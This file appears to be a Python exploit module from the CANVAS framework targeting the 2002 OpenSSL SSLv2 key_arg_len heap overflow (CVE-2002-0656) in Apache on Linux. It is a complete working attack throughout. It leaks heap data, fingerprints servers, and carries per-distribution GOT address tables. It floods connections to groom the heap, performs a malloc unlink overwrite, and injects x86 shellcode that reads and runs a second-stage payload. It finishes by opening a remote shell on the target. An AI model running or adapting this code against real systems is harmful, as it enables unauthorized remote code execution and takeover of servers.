#! /usr/bin/env python

#OpenSSL key_arg_len heap overflow

#Bug Class: heap overflow
#author: sinan.eren@immunityinc.com

import socket
import sys
import select
import time
import struct
import os
import getopt

sys.path.append(".")
sys.path.append("../../")

import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit
from shellcode import linuxshell
from openssl_client import *
from MOSDEF import mosdef
from linuxNode import linuxNode
import linuxMosdefShellServer

from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet

VERSION = "0.2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386"] ]

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="OpenSSL"
DOCUMENTATION["Date public"]="Jul 30, 2002"
DOCUMENTATION["CERT Advisory"]="http://www.cert.org/advisories/CA-2002-23.html"
DOCUMENTATION["CVE Name"]="CVE-2002-0656"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0656"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["References"]="http://www.openssl.org/news/secadv_20020730.txt"
DOCUMENTATION["Repeatability"] = "Multiple"
DOCUMENTATION["WARNING"] = "On busy webservers it might require couple of attempts for success.\n"+\
             "In such cases please run the exploit twice or more."

DESCRIPTION="OpenSSL key_arg_len Overflow"
NAME="OpenSSL key_arg_len Overflow"

notes = """
(gdb) x/x &__morecore
0x4212df80 <__morecore>:        0x4207df44
(gdb) x/x &main_arena
0x4212dfa0 <main_arena>:        0x00000000
(gdb) printf "%d\n", 0x4212dfa0 - 0x4212df80
32
"""

class OpenSSL_Linux_Exploit:
    
    def __init__(self, target, port=443):
        self.host = target
        self.port = int(port)
        self.debug = 1
        self.flood = []
        self.dist = []    #array of possible distances from ciphers to our buffer
        self.tryallGOT = 0
        self.forcemorecore = 0
        self.morecore = 0
        
    def set_shellcode(self, shellcode):
        self.stage2code = shellcode

    def get_server_from_header(self):
        
        try:
            d = OpenSSLClient(self.host, self.port)
            d.connect_ssl()
            d.send_client_hello()
            d.get_server_hello()
            d.send_client_master_key()
            d.generate_keys()
            d.get_server_verify()
            d.send_client_finish()
            d.get_server_finish()
            
            self.log("Sending HEAD request.")
            d.write_ssl("HEAD / HTTP/1.0\r\n\r\n")
            return filter(lambda x: x.find("Server:") >= 0, d.read_ssl().split("\n"))[0]
        
        except Exception, msg:
            print str(msg)
            return ""
        
    def find_GOT_from_server(self, buf):
        """from solar eclipse's list, TODO: add our values if any unique
            
           objdump -R /usr/sbin/apache | grep free

		"Gentoo (apache-1.3.24-r2)",		        0x08086c34
		"Debian Woody GNU/Linux 3.0 (apache-1.3.26-1)",	0x080863cc
		"Slackware 7.0 (apache-1.3.26)",	        0x083d37fc
		"Slackware 8.1-stable (apache-1.3.26)",		0x080b2100
		"RedHat Linux 6.0 (apache-1.3.6-7)",		0x080707ec
		"RedHat Linux 6.1 (apache-1.3.9-4)",		0x0808ccc4
		"RedHat Linux 6.2 (apache-1.3.12-2)",		0x0808f614
		"RedHat Linux 7.0 (apache-1.3.12-25)",		0x0809251c
		"RedHat Linux 7.1 (apache-1.3.19-5)",		0x0809af8c
		"RedHat Linux 7.2 (apache-1.3.20-16)",		0x080994d4
		"Redhat Linux 7.2 (apache-1.3.26 w/PHP)",	0x08269988
		"RedHat Linux 7.3 (apache-1.3.23-11)",		0x0808528c
		"SuSE Linux 7.0 (apache-1.3.12)",		0x0809f54c
		"SuSE Linux 7.1 (apache-1.3.17)",		0x08099984
		"SuSE Linux 7.2 (apache-1.3.19)",		0x08099ec8
		"SuSE Linux 7.3 (apache-1.3.20)",		0x08099da8
		"SuSE Linux 8.0 (apache-1.3.23-137)",		0x080861c8
		"SuSE Linux 8.0 (apache-1.3.23)",		0x08086168
		"Mandrake Linux 7.1 (apache-1.3.14-2)",		0x0809f6c4
		"Mandrake Linux 8.0 (apache-1.3.19-3)",		0x0809ea98
		"Mandrake Linux 8.1 (apache-1.3.20-3)",		0x0809e97c
		"Mandrake Linux 8.2 (apache-1.3.23-4)",		0x08086580

        """
        self.GOTent = {}
        
        self.GOTent["Red Hat"] = {"1.3.6": [0x080707ec], "1.3.9": [0x0808ccc4], "1.3.12": [0x0808f614, 0x0809251c],\
                                  "1.3.19": [0x0809af8c], "1.3.20": [0x080994d4], "1.3.26": [0x08269988], "1.3.23": [0x0808528c] }
        self.GOTent["SuSE"] = {"1.3.12": [0x0809f54c], "1.3.17": [0x08099984], "1.3.19": [0x08099ec8],\
                               "1.3.20": [0x08099da8], "1.3.23": [0x080861c8, 0x08086168] }
        self.GOTent["Mandrake"] = { "1.3.14": [0x0809f6c4], "1.3.19": [0x0809ea98], "1.3.20": [0x0809e97c], "1.3.23": [0x08086580] }
        self.GOTent["Slackware"] = {"1.3.26": [0x083d37fc], "1.3.26": [0x080b2100] }
        self.GOTent["Debian"] = { "1.3.26": [0x080863cc] }
        self.GOTent["Gentoo"] = { "1.3.24": [0x08086c34] }
        
        try:
            version = filter(lambda x: x.find("Apache") >= 0, buf.split(" "))[0]
            version = version[version.find("/")+1:]
            self.log("Apache Version: %s" % version)
        except:
            return ""
        
        try:
            distro = filter(lambda x: buf.find(x) >= 0, self.GOTent.keys())[0]
            self.log("Linux Distro: %s" % distro)
        except:
            return ""

        if distro == None:
            return ""
        
        try:
            dc = self.GOTent[distro]
            for each in dc[version]:
                self.log("GOT['free']: 0x%.8x" % each)
            return dc[version]
        except:
            return ""
    def chunksize(self, size):
        return (size + 0x7) & ~0x7

    def bin_index(self, size):
        """
        #define largebin_index(sz)                                                   \
(((((unsigned long)(sz)) >>  6) <= 32)?  56 + (((unsigned long)(sz)) >>  6): \
 ((((unsigned long)(sz)) >>  9) <= 20)?  91 + (((unsigned long)(sz)) >>  9): \
 ((((unsigned long)(sz)) >> 12) <= 10)? 110 + (((unsigned long)(sz)) >> 12): \
 ((((unsigned long)(sz)) >> 15) <=  4)? 119 + (((unsigned long)(sz)) >> 15): \
 ((((unsigned long)(sz)) >> 18) <=  2)? 124 + (((unsigned long)(sz)) >> 18): \
                                        126)
"""
        if (size >> 6) <= 32:
            return 56 + (size >> 6)
        elif (size >> 9) <= 20:
            return 91 + (size >> 9)
        elif (size >> 12) <= 10:
            return 110 + (size >> 12)
        elif (size >> 15) <= 4:
            return 119 + (size >> 15)
        elif (size >> 18) <= 2:
            return 124 + (size >> 18)
        else:
            return 126
        
    def extract_morecore(self, buf):
        """
        (gdb) x/x &__morecore
        0x4212df80 <__morecore>:        0x4207df44
        (gdb) x/x &main_arena
        0x4212dfa0 <main_arena>:        0x00000000
        (gdb) printf "%d\n", 0x4212dfa0 - 0x4212df80
        32
        """
        #print "chunk infoleak"        
        #for i in range(0, len(buf)-4, 4):
            #print "%d: 0x%.8x" % (i, struct.unpack("<L", buf[i:i+4])[0])
        buf = buf[192:]
        l = len(buf) & ~16
        for i in range(0, l, 4):
            pr = struct.unpack("<L", buf[i:i+4])[0]
            sz = struct.unpack("<L", buf[i+4:i+8])[0]
            fd = struct.unpack("<L", buf[i+8:i+12])[0]
            bk = struct.unpack("<L", buf[i+12:i+16])[0]
            #print "0x%.8x 0x%.8x 0x%.8x 0x%.8x" % (pr, sz, fd, bk)
            if fd == bk and fd > 0x40000000:
                sz = self.chunksize(sz)
                if sz > 0 and sz < 0xf5000: 
                #more than 1MB is handled by mmap shouldn't be a chunk
                    sz = self.bin_index(sz)*8
                    main_arena = fd - sz
                    self.morecore = main_arena - 0x20
                    #self.log("__morecore hook: 0x%.8x\n" % self.morecore)
                    return self.morecore
        return 0
    
    #FALSE: Failed, TRUE: Passed, Negative: Retry
    def infoleak(self, enforce_morecore=0, verbose=1):
        
        try:
            
            d = OpenSSLClient(self.host, self.port)
            d.connect_ssl()
            d.send_client_hello()
            d.get_server_hello()
            
            session_id_len_ovf = "A"*52
            session_id_len_ovf += struct.pack("<L", 0x200)
            d.send_client_master_key(session_id_len_ovf)
            
            d.generate_keys()
            d.get_server_verify()
            d.send_client_finish()
            
            try:
                buf = d.get_server_finish(1)
            except Exception, msg:
                del d
                self.log("Infoleak failed: %s" % str(msg))
                self.log("Remote end is not vulnerable.")
                return 0
            
            #eat first byte that represents the sslv2 packet
            #rest is SSL_SESSION stucture
            buf = buf[1:]
            self.cipher = struct.unpack("<L", buf[100:104])[0]
            self.ciphers = struct.unpack("<L", buf[108:112])[0]
            if not self.morecore:
                self.morecore = self.extract_morecore(buf)
            
            del d
            
            if (not self.morecore) or enforce_morecore:
                if verbose:
                    self.log("Couldn't leak any pointer to the main_arena. Retry.")
                return -1 #RETRY!
            
            #if verbose:
                #self.log("Infoleak successful.")
                #self.log("cipher: 0x%.8x ciphers: 0x%.8x morecore_hook: 0x%.8x" % (self.cipher, self.ciphers, self.morecore))
                
            #return True since everything went well
            return 1
        
        except Exception, msg:
            self.log("Infoleak failed: %s" % str(msg))
            return 0
    
    def ssl_connection(self):
        
        try:
            #sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
            sck = self.gettcpsock()
            sck.connect((self.host, self.port))
        except Exception, msg:
            print str(msg)
            return 0
        
        self.flood.append(sck)
        return 1
    
    def do_flood(self, count):
        for i in range(0, count):
            ret = self.ssl_connection()
            
    def close_flood(self):
        for each in self.flood:
            each.close()
        self.flood = []
        
    def do_infoleak_consistency(self):
        self.log("Checking for infoleak consistency.")
        
        self.infoleak()
        a, b = self.cipher, self.ciphers
        self.log("cipher: 0x%.8x, ciphers: 0x%.8x" % (self.cipher, self.ciphers))
        
        self.infoleak()
        c, d = self.cipher, self.ciphers
        self.log("cipher: 0x%.8x, ciphers: 0x%.8x" % (self.cipher, self.ciphers))
        
        #self.infoleak()
        #self.log("cipher: 0x%.8x, ciphers: 0x%.8x" % (self.cipher, self.ciphers))
        
        if a == c and b == d and c == self.cipher and d == self.ciphers:
            return 1
        else:
            return 0
        
    def ssl_unlink(self, where, what):
        try:
        #if 1:    
            d = OpenSSLClient(self.host, self.port)
            d.connect_ssl()
            d.send_client_hello()
            d.get_server_hello()
            
            exp_buf = "A"*128
            exp_buf += struct.pack("<L", 0x00)
            exp_buf += struct.pack("<L", 0x00)
            exp_buf += struct.pack("<L", 0x41424344L)
            exp_buf += struct.pack("<L", 0x01)
            exp_buf += "A"*12
            exp_buf += struct.pack("<L", self.cipher)
            exp_buf += "A"*4
            exp_buf += struct.pack("<L", 0x00) #self.ciphers)
            exp_buf += "\x00"*16
            exp_buf += struct.pack("<L", 0x00)
            exp_buf += struct.pack("<L", 0x11)
            exp_buf += struct.pack("<L", where - 0xc)
            exp_buf += struct.pack("<L", what)
            exp_buf += struct.pack("<L", 0x10)
            exp_buf += struct.pack("<L", 0x10)

            exp_buf+="\xeb\x0c"
            exp_buf+="A"*12

            # little findsck that loops a recv
            # when the recv succeeds it writes over itself
            # causing the loop to now execute the received code
            # (nice trick by some smart people! thx)
            findsck="""
            xorl %edx,%edx
baseloop:
            xorl %ebx,%ebx
            pushl %ebx
            movw $0x4141,%bx
            pushl %ebx
            call overwriteme
            // need to bridge the offset to codestartshere
            // in stage 2 so it gets nopped out and our code
            // is there post the success recv (15 nops)
overwriteme:
            pushl %edx
            movl %esp,%ecx
            xorl %ebx,%ebx
            movb $11,%bl
            decb %bl
            xorl %eax,%eax
            movb $102,%al
            int $0x80
codestartshere:
            incl %edx
            jmp baseloop
            """

            findsck = mosdef.assemble(findsck, "X86")
            exp_buf+=findsck

            # we assemble it here because we do not want to wait
            # for the assemble, such a delay might make us miss
            # our socket

            confirm  = "nop\n"*15 # bridge nops
            confirm += """
            pushl $0x68676665
            pushl $0x64636261
            movl %esp,%ecx   
            movl %edx,%ebx
            xorl %eax,%eax
            movl %eax,%edx
            movb $8,%dl   
            movb $4,%al
            int $0x80
            """
            confirm = mosdef.assemble(confirm, "X86")

            d.send_client_master_key(exp_buf)            
            d.generate_keys()
            d.get_server_verify()
            
            #corrupt connection id
            d.corrupt_connid()
            d.send_client_finish()
            #d.get_server_finish()

            d.recvstuff(d.sck)
            
            # send the confirm code and stage2 shellcode

            d.sendstuff(d.sck, confirm + self.shellcode)
            time.sleep(0.2)

            s = d.recvstuff(d.sck, 8)

            #try:
            #    print "s: " + s
            #except:
            #    pass

            if s == "abcdefgh":
                print "Owned!!!"
            else:
                #self.log("failed.");
                return 0
            
            #for each in s:
                #print "%.2x " % ord(each),
            #print "\n\n"
            
            return d.sck
        
        except Exception, msg:
            #self.log("unlink exception: %s" % str(msg))
            return 0
        
    def do_consistency(self):
        count = 30
        while 1:
            self.log("Creating %d connections." % count)
            self.do_flood(count)
            if (not self.do_infoleak_consistency()) and count < 60:
                count += 10
                continue
            if count > 60:
                self.log("Couldn't get consistent infoleak values. Bailing out.")
                return 0
            else:
                break
        return 1
    
    def do_sploit(self):
        
        if not self.infoleak():
            return 0
        
        buf = self.get_server_from_header()
        error = 0

        if not buf:
            error = 1
        else:
            GOT = self.find_GOT_from_server(buf)
            if len(GOT) == 0:
                error = 1
                
        if error:
            self.forcemorecore = 1
            self.log("There is no known GOT['free'] entry or couldn't retrive Apache version information from server reponse.\n"+\
                     "Trying __morecore hook.")     
        
        #DoS some old process' hangin around for ages ...
        #self.log("DoSing old apache processes'.")
        #for each in range(0, 30):
        #    self.ssl_unlink(0xdeadbeefL, 0x12345678L)
        #    time.sleep(1)

        if not self.do_consistency():
            return 0
        
        #if 0:
            #self.infoleak()
            #self.log("ciphers: %.8x shellcode: %.8x" % (self.ciphers, (self.ciphers + 16)))
            #self.ssl_unlink(0x809af8c, (self.ciphers + 16))
            #self.close_flood()
            #raw_input()
        #return 0
        
        #we're supposed to be dealing with a freshly forked apache child now.
        #do the infoleak one last time if self.forcemorecore is set.

        if self.forcemorecore == 1 and self.morecore == 0:
            count = 5
            while count:
                ret = self.infoleak(self.forcemorecore)
                if ret < 0:
                    count -= 1
                    continue
                elif ret == 0:
                    #infoleak failed ? bizzare lets try cpl of more times
                    #add a hook here if neccessary
                    continue
                elif ret == 1:
                    break
        
        if self.forcemorecore and self.morecore == 0:
            self.tryallGOT = 1

        if self.morecore:
            for i in range(0, 10):
                self.log("Trying __morecore entry at 0x%.8x shellcode at 0x%.8x" % (self.morecore, (self.ciphers+16)))
                self.sck = self.ssl_unlink(self.morecore, (self.ciphers + 16))
                if self.sck:
                    time.sleep(2)
                    self.close_flood()

                    try:
                        node=linuxNode()
                        node.parentnode=self.socknode
                        linuxMosdefShellServer.linuxshellserver(self.sck,node,logfunction=self.logfunction)
                        self.log("Calling startup for MOSDEF shell server")
                        node.startup()
                        self.setInfo("%s attacking %s:%d - done (succeeded!)" % (NAME, self.host, self.port))
                        return node
                    except:
                        self.log("Error making shell listener")
                        return None
                
                else:
                    self.close_flood()                    
                    #if i == 2:
                    #    for cnt in range(0, 10):
                    #        self.ssl_unlink(0xdeadbeefL, 0x12345678L)
                    #        
                    self.do_consistency()
                    time.sleep(2)                        
                        
        #do the sploit        
        if self.tryallGOT:
            GOT = self.GOTent.values()
            
        if len(GOT) > 0:
            #try everything twice ... ;)
            GOT += GOT
            l = len(GOT)
            for each in GOT:
                self.log("Trying GOT entry at 0x%.8x shellcode at 0x%.8x" % (each, (self.ciphers+16)))
                self.sck = self.ssl_unlink(each, (self.ciphers + 16))
                #do shellcode checks and return if successful
                if self.sck:
                    # instead of solars stage 2 we now do a MOSDEF stage 2
                    time.sleep(2)
                    self.close_flood()

                    try:
                        node = linuxNode()
                        node.parentnode = self.socknode
                        linuxMosdefShellServer.linuxshellserver(self.sck,node,logfunction=self.logfunction)
                        self.log("Calling startup for MOSDEF shell server")
                        node.startup()
                        self.setInfo("%s attacking %s:%d - done (succeeded!)" % (NAME, self.host, self.port))
                        return node
                    except:
                        self.log("Error making shell listener")
                    
                else:
                    if GOT.index(each) != (l-1):
                        i = len(self.flood)
                        self.close_flood()
                        for cnt in range(0, i):
                            self.ssl_unlink(0xdeadbeefL, 0x12345678)
                            
                        time.sleep(8)
                        self.do_consistency()

        self.setInfo("%s attacking %s:%d - done (failed.)" % (NAME, self.host, self.port))
        self.log("failed.")
        return 0
    
class theexploit(tcpexploit, OpenSSL_Linux_Exploit):
    
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(443)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\r\n"
        self.setInfo(DESCRIPTION)
        self.name=NAME
        return
    
    def createShellcode(self):
        self.shellcode = """
        movl %ebx,%esi
        // %esi has our fd
        xorl %eax,%eax
        xorl %edx,%edx
        xorl %edi,%edi
        // read the first 4 bytes..len value
        movb $4,%dl
        movl %esp,%ecx
        movl %esi,%ebx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        movl (%esp),%edi
        // our total len is in %edi..let the games begin
        // make room
        subl %edi,%esp
        // save original %esp
        movl %esp,%esi
readexecloop:
        xorl %eax,%eax
        movl %edi,%edx
        movl %esp,%ecx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        cmpl %edi,%eax
        je execute
        subl %eax,%edi
        addl %eax,%esp
        jmp readexecloop
        execute:
        // jmp to execute .. ebx has the fd
        // reset stackpointer to prevent instruction heckups
        movl %esi,%esp
        jmp *%esp

        exit:
        xorl %ebx,%ebx
        xorl %eax,%eax
        incb %al
        int $0x80
        """
        self.shellcode = mosdef.assemble(self.shellcode, "X86")
        return self.shellcode
      
    def neededListenerTypes(self):
        return []
    
    def test(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))

        OpenSSL_Linux_Exploit.__init__(self, self.host)
        return self.infoleak()
    
    def run(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))

        self.socknode = self.argsDict["passednodes"][0]
        self.log("OpenSSL Key Length Exploit hitting host %s:%s"%(self.host,self.port))
        try:
            return self.dorun()
        except Exception, msg:
            self.log(str(msg))
            return 0
        
    def dorun(self):
        #if self.arch
        #later ...
        OpenSSL_Linux_Exploit.__init__(self, self.host, self.port)
        self.set_shellcode(self.shellcode)
        return self.do_sploit()
        
    def usage(self):
        import sys
        print "Usage: "+sys.argv[0]+" -t target [-p port:443]"
        
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

